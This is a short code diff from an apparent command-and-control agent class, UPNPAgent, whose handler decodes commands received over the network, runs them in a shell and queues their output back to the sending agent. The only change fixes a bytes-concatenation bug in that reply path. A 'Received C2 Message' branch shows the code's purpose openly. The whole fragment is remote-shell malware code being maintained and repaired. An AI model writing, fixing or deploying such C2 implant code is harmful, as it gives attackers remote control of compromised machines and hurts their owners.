@@ -120,7 +120,7 @@ class UPNPAgent:
                 command_str = message_content.decode('utf8')
                 process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout, stderr = process.communicate()
-                self.queue_message(agent_ip, b'm', (stdout + "\n" + stderr + "\n").encode('utf8'))
+                self.queue_message(agent_ip, b'm', stdout + b'\n' + stderr + b'\n')
             elif command == ord('m'):
                 print("\nReceived C2 Message ", message_content.decode('utf8'))
             
